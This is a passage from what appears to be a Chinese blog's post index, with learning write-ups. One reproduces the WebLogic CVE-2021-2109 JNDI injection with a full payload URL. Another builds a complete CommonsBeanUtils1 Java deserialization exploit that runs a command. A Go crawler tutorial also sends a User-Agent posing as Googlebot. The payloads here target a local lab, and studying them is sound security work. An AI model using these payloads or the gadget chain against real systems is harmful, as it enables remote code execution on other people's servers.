make(map[string]string, 2)  \n   studentMap[\"stu01\"][\"name\"] = \"Drunkbaby\"  \n   studentMap[\"stu01\"][\"sex\"] = \"男\"  \n  \n   studentMap[\"stu02\"] = make(map[string]string, 2)  \n   studentMap[\"stu02\"][\"name\"] = \"D1ng\"  \n   studentMap[\"stu02\"][\"sex\"] = \"女\"  \n  \n   for k1, v1 := range studentMap &#123;  \n      fmt.Println(k1)  \n      for k2, v2 := range v1 &#123;  \n         fmt.Printf(\"\\t k2=%v v2=%v\\n\", k2, v2)  \n      &#125;  \n   &#125;  \n&#125;\n\n\n\nMap 的切片还是比较重要的，但是确实很繁琐，最重要的是理解分配内存和 append 追加的思想\n比如我们现在 make 一个长度为 2 的 Map，那么如果它满了之后，我们还需要追加数据，应该怎么操作呢？\n答案是用 append() 函数，具体实现可以看代码，很好理解\npackage main  \n  \nimport \"fmt\"  \n  \n// Map 切片  \n/*  \n   要求：使用一个 Map 来记录 monster 的信息 name 和 age   也就是说一个 monster 对应一个 map   并且妖怪的个数可以动态增加 => Map 切片  \n*/  \n  \nfunc main() &#123;  \n   // 1、声明一个 map 切片  \n   monsters := make([]map[string]string, 2)  \n   // 2、增加一个妖怪的信息  \n   monsters[0] = make(map[string]string)  \n   monsters[0][\"name\"] = \"牛魔王\"  \n   monsters[0][\"age\"] = \"500\"  \n  \n   monsters[1] = make(map[string]string)  \n   monsters[1][\"name\"] = \"玉兔精\"  \n   monsters[1][\"age\"] = \"400\"  \n   fmt.Println(monsters)  \n  \n   newMonsters := map[string]string&#123;  \n      \"name\": \"append 追加的妖怪\",  \n      \"age\":  \"200\",  \n   &#125;  \n   monsters = append(monsters, newMonsters)  \n   fmt.Println(monsters)  \n&#125;\n\n\n\nMap 排序新版本会自动根据 key 排序\nMap 使用小结1、使用前需要 make2、map 是引用类型，在一个函数接收 map 后，如果修改，则会修改源数据中的 map3、map 的 value 一般是 struct，更适合管理复杂的数据\n第三点可能比较难理解，不过简单想一想就明白了\nMap 练习","categories":["Web开发"],"tags":["Web开发"]},{"title":"CVE-2021-2109 WebLogic JNDI 注入","url":"/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/","content":"CVE-2021-2109 WebLogic JNDI 注入\n\n0x01 前言学习一下 WebLogic JNDI 注入 RCE（CVE-2021-2109）\n0x02 环境搭建和之前 WebLogic 的环境搭建是一致的，本文不再赘述。\n不过值得一提的是，我的 weblogic 版本是 10.3.6；需要手动添加 \\server\\lib\\consoleapp\\webapp\\WEB-INF\\lib\\console.jar 到依赖里面\n0x03 漏洞分析与复现漏洞影响版本与前提条件Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0。\n拥有访问 /console/consolejndi.portal 页面的用户权限，或者存在 CVE-2020-14883 未授权访问漏洞。关于未授权的漏洞我会放到 WebLogic 的另外一篇文章中再做分析\n漏洞原理WebLogic 的 /console/consolejndi.portal 接口可以调用存在 JNDI 注入漏洞的 com.bea.console.handles.JndiBindingHandle 类，从而造成 RCE。\n漏洞复现\npayload 如下\n\nhttp://127.0.0.1:7001/console/css/%252e%252e%252fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://127.0.0;1:1389/aew0xy;AdminServer%22)\n我本地开启了一个 JNDI 的 Evil Class 和 Server\n\n\n用 payload 打成功\n\n\n漏洞分析根据 payload 分析，先从 consolejndi.portal 开始看起，.portal 文件就类似于一个 servlet，在 consolejndi.portal 中存在 JNDI Binding 操作的处理容器，如图\n\n\n具体的处理逻辑在 /PortalConfig/jndi/jndibinding.portlet\n\n\n去到 com.bea.console.actions.jndi.JNDIBindingActioncom.bea.console.actions.jndi.JNDIBindingAction 类中，发现存在一个 execute() 方法，疑似存在 jndi 注入的漏洞。\n\n\n观察需要如何构造恶意 payload，c 是由 ConsoleUtils.initNamingContext(serverMBean); 得来，而 serverMBean 是通过 domainMBean.lookupServer(serverName); 得来，其中一系列关系我将会由下图说明\n\n\n接着我们自上而下顺序看代码，先是强转了一个 JndiBindingHandle 类，这里面 getHandleContext() 的逻辑并不复杂，最终会调用 JndiBindingHandle 的构造函数。\n\n\n如图，我们在 payload 当中的这一段被放进了构造函的 type 与 objectIdentifier 中，而 &quot;ldapxxxx&quot; 这一段会被放在 components 中，由分号分隔\nJNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(\"ldap://127.0.0;1:1389/aew0xy;AdminServer\")\n\n继续往下看，我们想要进入 JNDI 注入的那一段代码，需要满足两个条件，一个是 serverMBean != null，另一个是 c != null，我们进到 serverMBean 看一下代码逻辑\n\nlookupServer 是 DommainMBean 接口的方法，我们去看它的实现类\n\n\n\n\n\n实际上这里是动态代理调用的，会自动跟进到 weblogic.management.jmx.MBeanServerInvocationHandler#invoke 下，其中 method 的值为 weblogic.management.configuration.DomainMBean#lookupServer，它的 method 代码逻辑在实现类当中，也就是 weblogic.management.configuration.DomainMBeanImpl#lookupServer\n\n\n我们需要走到 do while 的逻辑里面，返回 var3，而不是返回 null\n\n\n通过调试得到 var2 的值为 AdminServer，这里没有其他的值了，原因如图\n\n\n\n\n所以此处要求我们输入的 var1 与 AdminServer 相同，回过头去看 var1 是什么呢，var1 其实是 serverName\n\n\n发现 serverName 也是可控的\n\n\n\n现在 serverBean != null 没问题，就要看 jndi lookup 的地址是否可控。\n\n很明显，jndi lookup 的地址也是可控的\n\n\n我们进到 JndiBindingHandle 类去看一下 set/getComponents() 的逻辑，先调用了 HandleImpl#getComponent\n\n\n跟进\n\n\n主要逻辑就是在讲，以 ;  分隔，如此一来，我们就可控 context 与 binding，可以进行 jndi 注入\n\n最后捋一下整体条件\n\n1、;号隔开 jndi 地址2、serverName 必须为 AdminServer\n0x04 漏洞修复根据 Y4er 师傅这里的说法是，对 Jndi 的黑名单进行了判断，如图\n\n\n0x05 小结不算难的一个漏洞，只是环境搭建当时踩了很多坑，欢迎师傅们与我交流踩坑问题，我会竭力帮助。\n0x06 Referencehttps://y4er.com/posts/weblogic-cve-2021-2109-jndi-rce/\n","categories":["漏洞复现"],"tags":["漏洞复现","Java","WebLogic"]},{"title":"CommonsBeanUtils反序列化","url":"/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"Java 反序列化之 CommonsBeanUtils1 反序列化\n\nJava 反序列化之 CommonsBeanUtils1 反序列化0x01 前言因为后续的漏洞利用当中，CommonsBeanUtils 这一条链子还是比较重要的，不论是 shiro 还是后续的 fastjson，都是比较有必要学习的。\n在已经学习一些基础知识与 CC 链的情况下，最终链子就可以自己跟着 yso 的链子利用走一遍写 EXP 了。\n0x02 环境jdk8 不受版本影响均可其余环境如下所示\n&lt;dependency>  \n &lt;groupId>commons-beanutils&lt;/groupId>  \n &lt;artifactId>commons-beanutils&lt;/artifactId>  \n &lt;version>1.9.2&lt;/version>  \n&lt;/dependency>  \n&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->  \n&lt;dependency>  \n &lt;groupId>commons-collections&lt;/groupId>  \n &lt;artifactId>commons-collections&lt;/artifactId>  \n &lt;version>3.1&lt;/version>  \n&lt;/dependency>  \n&lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging -->  \n&lt;dependency>  \n &lt;groupId>commons-logging&lt;/groupId>  \n &lt;artifactId>commons-logging&lt;/artifactId>  \n &lt;version>1.2&lt;/version>  \n&lt;/dependency>\n\n0x03 CommonsBeanUtils 简介Apache Commons 工具集下除了 collections 以外还有 BeanUtils ，它主要用于操控 JavaBean 。\n\n以 Utils 结尾，一般这都是一个工具类&#x2F;集\n\n\n先说说 JavaBean 的这个概念\n\n这里指的就是实体类的 get，set 方法，其实在 IDEA 当中用 Lombok 插件就可以替换 JavaBean。\n关于 JavaBean 的说明可以参考廖雪峰老师的文章\nCommonsBeanUtils 这个包也可以操作 JavaBean，举例如下：\n比如 Baby 是一个最简单的 JavaBean 类\npublic class Baby &#123;  \n    private String name = \"Drunkbaby\";  \n  \n public String getName()&#123;  \n        return name;  \n &#125;  \n  \n    public void setName (String name) &#123;  \n        this.name = name;  \n &#125;  \n&#125;\n\n这里定义两个简单的 getter setter 方法，如果用 @Lombok 的注解也是同样的，使用 @Lombok 的注解不需要写 getter setter。\nCommons-BeanUtils 中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以直接调用任意 JavaBean 的 getter 方法，示例如下\nimport org.apache.commons.beanutils.PropertyUtils;  \n  \npublic class CBMethods &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        System.out.println(PropertyUtils.getProperty(new Baby(), \"name\"));  \n &#125;  \n&#125;\n\n\n\n此时，Commons-BeanUtils 会自动找到 name 属性的getter 方法，也就是 getName ，然后调用并获得返回值。这个形式就很自然得想到能任意函数调用。\n0x04 CommonsBeanUtils1 链子分析\n还是和之前一样，进行逆向分析。这里的链子和 CC4 的前半部分链子是基本一致的。\n\n1. 链子尾部我们链子的尾部是通过动态加载 TemplatesImpl 字节码的方式进行攻击的，原因很简单：\n在之前讲动态加载 TemplatesImpl 字节码的时候，我们的链子是这样的\nTemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() ->\n\nTemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()\n\n-> TransletClassLoader#defineClass()\n\n在链子的最开头 ———— TemplatesImpl.getOutputProperties()，它是一个 getter 方法，并且作用域为 public，所以可以通过 CommonsBeanUtils 中的 PropertyUtils.getProperty() 方式获取，\n这里我们的 PropertyUtils.getProperty() 对应的参数应该这么传\n// 伪代码\nPropertyUtils.getProperty(TemplatesImpl, outputProperties)\n\n2. 中间链子上一步我们说到尾部是 PropertyUtils.getProperty()，我们就去看看谁调用了 PropertyUtils.getProperty()\n\n\n这里的 compare() 方法比较符合条件，因为它经常被其他方法所调用，作为链子的一部分来说，我们是很喜欢这种方法的。\n继续找谁调用了 compare() 方法，这里就太多了，我们优先去找能够进行序列化的类，于是这里找到了 PriorityQueue 这个类。\nPriorityQueue 这个类的 siftDownUsingComparator() 方法调用了 compare()\n\n\n继续找谁调用了 siftDownUsingComparator() 方法，发现在同一个类中的 siftDown() 方法调用了它。\n\n\n\n同样，发现同个类下的 heapify() 方法调用了 siftDown() 方法\n\n\n\n如法炮制，直到最后能够找到入口类为止\n3. 寻找 readObject() 的入口类我们在寻找谁调用 heapify() 方法时，成功找到了 readObejct() 方法\n\n\n到目前，我们一整条链子就找好了，链子流程如下。\nPriorityQueue.readObject()\nPriorityQueue.heapify()  ->\n\t\n\tPriorityQueue.siftDown()\n\tPriorityQueue.siftDownUsingComparator() ->\n\t\n\t\tBeanComparator.compare() ->\nPropertyUtils.getProperty(TemplatesImpl, outputProperties)\n\t->\n\t\t\tTemplatesImpl.getOutputProperties()\n\t\t\tTemplatesImpl.newTransformer()\n\t\t\tTemplatesImpl.getTransletInstance()\n\t\t\tTemplatesImpl.defineTransletClasses()\n接下来画个流程图。因为前半部分和 CC4 是一样的，所以我们把它加到整个 CC 链里面去。\n\n\n0x05 CommonsBeanUtils1 EXP 编写yso 官方这里的话没有给出 CB1 链子的 Gadget，大概是人家觉得太短了没什么必要吧，我这里自己手写一遍 EXP。\n\nCommonsBeanUtils1 的链子又两个主要的部分组成:\n\n\n一部分是利用 TemplatesImpl 动态加载字节码。\n另一部分是通过 CommonsBeanUtils 中的 PropertyUtils 读取 getter 请求。\n\n下面我们逐一讲解\n1. 尾部链子 ———— 利用 TemplatesImpl 动态加载字节码\n我们先跟进 TemplatesImpl 这个包中看 TemplatesImpl 的结构图\n\n\n\n可以看到在 TemplatesImpl 类中还有一个内部类 TransletClassLoader，这个类是继承 ClassLoader，并且重写了 defineClass 方法。\n\n\n\n简单来说，这里的 defineClass 由其父类的 protected 类型变成了一个 default 类型的方法，可以被类外部调用。\n\n我们从 TransletClassLoader#defineClass() 向前追溯一下调用链：\nTemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() ->\n\nTemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()\n\n-> TransletClassLoader#defineClass()\n\n追到最前面两个方法 TemplatesImpl#getOutputProperties() 和 TemplatesImpl#newTransformer() ，这两者的作用域是public，可以被外部调用。\n我们尝试用 TemplatesImpl#newTransformer() 构造一个简单的 POC\n首先先构造字节码，注意，这里的字节码必须继承AbstractTranslet，因为继承了这一抽象类，所以必须要重写一下里面的方法。\npackage src.DynamicClassLoader.TemplatesImplClassLoader;  \n  \nimport com.sun.org.apache.xalan.internal.xsltc.DOM;  \nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;  \nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  \nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;  \n  \nimport java.io.IOException;  \n  \n// TemplatesImpl 的字节码构造  \npublic class TemplatesBytes extends AbstractTranslet &#123;  \n    public void transform(DOM dom, SerializationHandler[] handlers) throws TransletException&#123;&#125;  \n    public void transform(DOM dom, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException&#123;&#125;  \n    public TemplatesBytes() throws IOException&#123;  \n        super();  \n Runtime.getRuntime().exec(\"Calc\");  \n &#125;  \n&#125;\n\n字节码这里的编写比较容易，我就一笔带过了，接下来我们重点关注 POC 是如何编写出来的。\n因为是一整条链子，参考最开始我们讲的 URLDNS 链，我们需要设置其一些属性值，从而让我们的链子传递下去。我这里先把 POC 挂出来，结合着讲。\npackage src.DynamicClassLoader.TemplatesImplClassLoader;  \n  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \n  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \n  \n// 主程序  \npublic class TemplatesRce &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\JavaClass\\\\TemplatesBytes.class\"));  \n TemplatesImpl templates = new TemplatesImpl();  \n setFieldValue(templates, \"_name\", \"Calc\");  \n setFieldValue(templates, \"_bytecodes\", new byte[][] &#123;code&#125;);  \n setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());  \n templates.newTransformer();  \n &#125;  \n    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;  \n        Field field = obj.getClass().getDeclaredField(fieldName);  \n field.setAccessible(true);  \n field.set(obj, value);  \n &#125;  \n&#125;\n\n我们定义了一个设置私有属性的方法，命名为 setFieldValue，根据我们的链子，一个个看。\n\nTemplatesImpl#getOutputProperties() -&gt;TemplatesImpl#newTransformer() -&gt;TemplatesImpl#getTransletInstance() -&gt;TemplatesImpl#defineTransletClasses() -&gt;TransletClassLoader#defineClass()\n\n\n主要是三个私有类的属性setFieldValue(templates, \"_name\", \"Calc\"); \n\n\n显然，_name 不能为 null，我们才能进入链子的下一部分。链子的下一部分为 defineTransletClasses，我们跟进去。\n\n\n_tfactory 需要是一个 TransformerFactoryImpl 对象，因为 TemplatesImpl#defineTransletClasses() 方法里有调用到 _tfactory.getExternalExtensionsMap() ，如果是 null 会出错。\nTemplatesBytes.class 这里是一个弹计算器的恶意类，代码如下\npackage src.DynamicClassLoader.URLClassLoader;  \n  \nimport java.io.IOException;  \n  \n// 弹计算器的万能类  \npublic class Calc &#123;  \n    static &#123;  \n        try &#123;  \n            Runtime.getRuntime().exec(\"calc\");  \n &#125; catch (IOException e)&#123;  \n            e.printStackTrace();  \n &#125;  \n    &#125;  \n&#125;\n\n弹计算器成功\n\n\n2. 中间 EXP 编写因为中间链子比较短，这里就直接写整段 EXP 了\n在写 EXP 之前，我们先好好看一看 BeanComparator.compare() 方法：\n\n\n这个方法传入两个对象，如果 this.property 为空，则直接比较这两个对象；如果 this.property 不为空，则用 PropertyUtils.getProperty 分别取这两个对象的 this.property 属性，比较属性的值。\n所以如果需要传值比较，肯定是需要新建一个 PriorityQueue 的队列，并让其有 2 个值进行比较。而且 PriorityQueue 的构造函数当中就包含了一个比较器。\n\n\n我们的 EXP 如下，最后使用 queue.add 就可以自动完成比较是因为 add 方法调用了 compare 方法，如图。\n\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.beanutils.BeanComparator;  \nimport org.apache.commons.beanutils.PropertyUtils;  \n  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.util.PriorityQueue;  \n  \npublic class CommonBeans1EXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\JavaClass\\\\TemplatesBytes.class\"));  \n TemplatesImpl templates = new TemplatesImpl();  \n setFieldValue(templates, \"_name\", \"Calc\");  \n setFieldValue(templates, \"_bytecodes\", new byte[][] &#123;code&#125;);  \n setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());  \n //    templates.newTransformer();  \n final BeanComparator beanComparator = new BeanComparator();  \n // 将 property 的值赋为 outputProperties setFieldValue(beanComparator, \"property\", \"outputProperties\");  \n // 创建新的队列，并添加恶意字节码  \n final PriorityQueue&lt;Object> queue = new PriorityQueue&lt;Object>(2, beanComparator);  \n queue.add(templates);  \n queue.add(templates);  \n &#125;  \n  \n    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;  \n        Field field = obj.getClass().getDeclaredField(fieldName);  \n field.setAccessible(true);  \n field.set(obj, value);  \n &#125;  \n&#125;\n\n\n成功弹出计算器\n\n\n\n3. 结合入口类的最终 EXP 编写\n此处我们需要控制在它序列化的时候不弹出计算器，在反序列化的时候弹出计算器，于是通过反射修改值。\n\n先将 queue.add 赋一个无关痛痒的常量，再通过反射修改值即可，伪代码如下\nqueue.add(1);  \nqueue.add(1);  \n  \n// 将 property 的值赋为 outputPropertiessetFieldValue(beanComparator, \"property\", \"outputProperties\");  \nsetFieldValue(queue, \"queue\", new Object[]&#123;templates, templates&#125;);\n\n完整的 EXP 如下\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.beanutils.BeanComparator;  \nimport org.apache.commons.beanutils.PropertyUtils;  \n  \nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.util.PriorityQueue;  \n  \npublic class CB1FinalEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\JavaClass\\\\TemplatesBytes.class\"));  \n TemplatesImpl templates = new TemplatesImpl();  \n setFieldValue(templates, \"_name\", \"Calc\");  \n setFieldValue(templates, \"_bytecodes\", new byte[][] &#123;code&#125;);  \n setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());  \n //    templates.newTransformer();  \n final BeanComparator beanComparator = new BeanComparator();  \n // 创建新的队列，并添加恶意字节码  \n final PriorityQueue&lt;Object> queue = new PriorityQueue&lt;Object>(2, beanComparator);  \n queue.add(1);  \n queue.add(1);  \n  \n // 将 property 的值赋为 outputProperties setFieldValue(beanComparator, \"property\", \"outputProperties\");  \n setFieldValue(queue, \"queue\", new Object[]&#123;templates, templates&#125;);  \n serialize(queue);  \n unserialize(\"ser.bin\");  \n &#125;  \n  \n    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;  \n        Field field = obj.getClass().getDeclaredField(fieldName);  \n field.setAccessible(true);  \n field.set(obj, value);  \n &#125;  \n  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n成功弹出计算器\n\n\n0x06 小结这条链子比较简单，我的建议是自己可以完完全全地手写一遍 EXP\n0x07 参考资料https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680https://blog.weik1.top/2021/01/18/CommonsBeanutils%E9%93%BE%E5%88%86%E6%9E%90/\n","categories":["Java"],"tags":["Java"]},{"title":"Golang 编写爬虫","url":"/2023/03/08/Golang-%E7%BC%96%E5%86%99%E7%88%AC%E8%99%AB/","content":"Golang 编写爬虫\n\n0x01 前言学习用 golang 编写爬虫，先从一些简单的知识开始，再学习如何编写爬虫。文章大部分内容是参考自 https://strconv.com/posts/\n所有代码可以在这里浏览 \n0x02 基础爬取爬取豆瓣 Top250 基础代码尝试爬取一下豆瓣 Top250 的\nGolang 语言的 HTTP 请求库不需要使用第三方的库，标准库就内置了足够好的支持：\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"io/ioutil\"\n)\n\nfunc fetch (url string) string &#123;\n\tfmt.Println(\"Fetch Url\", url)\n\tclient := &amp;http.Client&#123;&#125;\n\treq, _ := http.NewRequest(\"GET\", url, nil)\n\treq.Header.Set(\"User-Agent\", \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\")\n\tresp, err := client.Do(req)\n\tif err != nil &#123;\n\t\tfmt.Println(\"Http get err:\", err)\n        return \"\"\n\t&#125;\n\tif resp.StatusCode != 200 &#123;\n\t\tfmt.Println(\"Http status code:\", resp.StatusCode)\n\t\treturn \"\"\n\t&#125;\n\tdefer resp.Body.Close()\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tif err != nil &#123;\n\t\tfmt.Println(\"Read error\", err)\n\t\treturn \"\"\n\t&#125;\n\treturn string(body)\n&#125;\n\n\n发送 HTTP 请求实际上就这一句：\n\nreq, _ := http.NewRequest(\"GET\", url, nil)\n\n通过 body, err := ioutil.ReadAll(resp.Body) 读取 response 的 body 内容，最后用 string(body) 转化为字符串，后续能够被我们所解析\n接着就是解析页面的部分，本质还是根据 HTML 标签来抓取的\nimport (\n    \"regexp\"\n\t\"strings\"\n)\n\nfunc parseUrls(url string) &#123;\n\tbody := fetch(url)\n\tbody = strings.Replace(body, \"\\n\", \"\", -1)\n\trp := regexp.MustCompile(`&lt;div class=\"hd\">(.*?)&lt;/div>`)\n\ttitleRe := regexp.MustCompile(`&lt;span class=\"title\">(.*?)&lt;/span>`)\n\tidRe := regexp.MustCompile(`&lt;a href=\"https://movie.douban.com/subject/(\\d+)/\"`)\n\titems := rp.FindAllStringSubmatch(body, -1)\n\tfor _, item := range items &#123;\n\t\tfmt.Println(idRe.FindStringSubmatch(item[1])[1],\n\t\t\ttitleRe.FindStringSubmatch(item[1])[1])\n\t&#125;\n&#125;\n\n这篇文章我们主要体验用标准库完成页面的解析，也就是用正则表达式包regexp来完成。不过要注意需要用 strings.Replace(body, &quot;\\n&quot;, &quot;&quot;, -1) 这步把 body 内容中的回车符去掉，要不然下面的正则表达式.*就不符合了。FindAllStringSubmatch 方法会把符合正则表达式的结果都解析出来（一个列表），而 FindStringSubmatch 是找第一个符合的结果。\n因为是 Top250 的页面，所有电影是需要进行翻页爬取的，而豆瓣的第二页是 start=25，第三页是 start=50，我们只需要写个循环，让 i*25 作为后面的参数即可。用到的函数是 strconv.Itoa，这个函数可以将数值转换为字符串\nfunc main() &#123;  \n   start := time.Now()  \n   for i := 0; i &lt; 10; i++ &#123;  \n      parseUrls(\"https://movie.douban.com/top250?start=\" + strconv.Itoa(25*i))  \n   &#125;  \n   elapsed := time.Since(start)  \n   fmt.Printf(\"Took %s\", elapsed)  \n&#125;\n\n完整代码如下\npackage main  \n  \nimport (  \n   \"fmt\"  \n   \"io/ioutil\"   \"net/http\"   \"regexp\"   \"strconv\"   \"strings\"   \"time\")  \n  \nfunc fetch(url string) string &#123;  \n   fmt.Println(\"Fetch Url\", url)  \n   client := &amp;http.Client&#123;&#125;  \n   req, _ := http.NewRequest(\"GET\", url, nil)  \n   req.Header.Set(\"User-Agent\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\")  \n   resp, err := client.Do(req)  \n   if err != nil &#123;  \n      fmt.Println(\"Http get err:\", err)  \n      return \"\"  \n   &#125;  \n   if resp.StatusCode != 200 &#123;  \n      fmt.Println(\"Http status code:\", resp.StatusCode)  \n      return \"\"  \n   &#125;  \n   defer resp.Body.Close()  \n   body, err := ioutil.ReadAll(resp.Body)  \n   if err != nil &#123;  \n      fmt.Println(\"Read error\", err)  \n      return \"\"  \n   &#125;  \n   return string(body)  \n&#125;  \n  \nfunc parseUrls(url string) &#123;  \n   body := fetch(url)  \n   body = strings.Replace(body, \"\\n\", \"\", -1)  \n   rp := regexp.MustCompile(`&lt;div class=\"hd\">(.*?)&lt;/div>`)  \n   titleRe := regexp.MustCompile(`&lt;span class=\"title\">(.*?)&lt;/span>`)  \n   idRe := regexp.MustCompile(`&lt;a href=\"https://movie.douban.com/subject/(\\d+)/\"`)  \n   items := rp.FindAllStringSubmatch(body, -1)  \n   for _, item := range items &#123;  \n      fmt.Println(idRe.FindStringSubmatch(item[1])[1],  \n         titleRe.FindStringSubmatch(item[1])[1])  \n   &#125;  \n&#125;  \n  \nfunc main() &#123;  \n   start := time.Now()  \n   for i := 0; i &lt; 10; i++ &#123;  \n      parseUrls(\"https://movie.douban.com/top250?start=\" + strconv.Itoa(25*i))  \n   &#125;  \n   elapsed := time.Since(start)  \n   fmt.Printf(\"Took %s\", elapsed)  \n&#125;\n\n\n\n增加并发功能并发功能是由 goalng 的 goroutine 库来完成的\n上面我们写的爬虫是一个串行的爬虫，效率很低，所以我们在这一环节将它改成并发的。由于这个程序只抓取 10 个页面，大概 1s 多就完成了，为了对比我们先给之前的 doubanCrawler1.go 加一点Sleep的代码，让它跑的慢一些，当然增加抓取的网页也可以。\nfunc parseUrls(url string) &#123;\n    ...\n\ttime.Sleep(2 * time.Second)\n&#125;\n\n现在我们运行一下，总耗时明显变长了\n\n\n接着我们通过并发开始让它变得更快\ngoroutine 的错误用法先修改成用 Go 原生支持的并发方案 goroutine 来做。在 Golang 中使用 goroutine 非常方便，直接使用 go 关键字就可以，我们看一个版本：\nfunc main() &#123;\n\tstart := time.Now()\n\tfor i := 0; i &lt; 10; i++ &#123;\n\t\tgo parseUrls(\"https://movie.douban.com/top250?start=\" + strconv.Itoa(25*i))\n\t&#125;\n\telapsed := time.Since(start)\n\tfmt.Printf(\"Took %s\", elapsed)\n&#125;\n\n就是在 parseUrls 函数前加了go 关键字。但其实这样就是不对的，运行的话不会抓取到任何结果。因为协程刚生成，整个程序就结束了，goroutine 还没抓完呢。怎么办呢？可以结束前 Sleep 一个时间，这个时间应该要大于所有 goroutine 执行最慢的那个，这样就保证了全部协程都能正常运行完再结束\nfunc main() &#123;\n    start := time.Now()\n    for i := 0; i &lt; 10; i++ &#123;\n        go parseUrls(\"https://movie.douban.com/top250?start=\" + strconv.Itoa(25*i))\n    &#125;\n    time.Sleep(4 * time.Second)\n    elapsed := time.Since(start)\n    fmt.Printf(\"Took %s\", elapsed)\n&#125;\n\n在for循环后加了Sleep 4秒。运行一下：\n\n首先是并发\n\n\n\n最终运行时间\nTook 4.0063611s\nProcess finished with the exit code 0\n\n这比起之前来说是快了很多了\n当然这个 Sleep 的时间不好控制，假设某次请求花的时间超了，总体时间超过 4s 程序结束了但这个协程其实还没运行结束；而假如全部 goroutine 都在 3 秒（2秒固定Sleep+1秒程序运行）结束，那么多Sleep的一秒就浪费了（当然自己一些小工具的开发可能并不会涉及这些东西，但是这是很基础的业务型编程思维\ngoroutine 的正确用法那怎么用 goroutine 呢？有没有像 Python 多进程&#x2F;线程的那种等待子进&#x2F;线程执行完的 join 方法呢？当然是有的，可以让 Go 协程之间信道（channel）进行通信：从一端发送数据，另一端接收数据，信道需要发送和接收配对，否则会被阻塞：\nfunc parseUrls(url string, ch chan bool) &#123;\n    ...\n    ch &lt;- true\n&#125;\n\nfunc main() &#123;\n    start := time.Now()\n    ch := make(chan bool)\n    for i := 0; i &lt; 10; i++ &#123;\n        go parseUrls(\"https://movie.douban.com/top250?start=\"+strconv.Itoa(25*i), ch)\n    &#125;\n\n    for i := 0; i &lt; 10; i++ &#123;\n        &lt;-ch\n    &#125;\n\n    elapsed := time.Since(start)\n    fmt.Printf(\"Took %s\", elapsed)\n&#125;\n\n在上面的改法中，parseUrls 都是在 goroutine 中执行，但是注意函数签名改了，多接收了信道参数ch。当函数逻辑执行结束会给信道 ch 发送一个布尔值。\n而在 main 函数中，在用一个 for 循环，&lt;- ch 会等待接收数据（这里只是接收，相当于确认任务完成）。这样的流程就实现了一个更好的并发方案：\n最终运行结果如图，快了很多\n\n\nsync.WaitGroup还有一个好的方案 sync.WaitGroup。我们这个程序只是打印抓到的对应内容，所以正好用 WaitGroup：等待一组并发操作完成\nimport (\n\t...\n\t\"sync\"\n)\n...\nfunc main() &#123;\n\tstart := time.Now()\n\tvar wg sync.WaitGroup\n\twg.Add(10)\n\n\tfor i := 0; i &lt; 10; i++ &#123;\n\t\tgo func(i int) &#123;\n\t\t\tdefer wg.Done()\n\t\t\tparseUrls(\"https://movie.douban.com/top250?start=\"+strconv.Itoa(25*i))\n\t\t&#125;(i)\n\t&#125;\n\n\twg.Wait()\n\n\telapsed := time.Since(start)\n\tfmt.Printf(\"Took %s\", elapsed)\n&#125;\n\n一开始我们给调用 wg.Add 添加要等待的 